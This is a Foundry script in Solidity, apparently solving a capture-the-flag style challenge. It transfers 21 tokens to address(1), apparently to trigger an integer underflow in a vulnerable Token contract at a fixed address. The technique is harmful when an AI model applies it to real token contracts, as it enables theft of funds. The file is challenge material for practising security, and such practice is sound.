// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Token.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract TokenSolution is Script {
    Token public token = Token(0x61D97222867f6A3C54Ab8155aa9CdAd425f19682);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        token.transfer(address(address(1)), 20+1);
        //console.log("My balance:", token.balanceOf(vm.envAddress("MY_ADDRESS")));
        vm.stopBroadcast();
    }
}

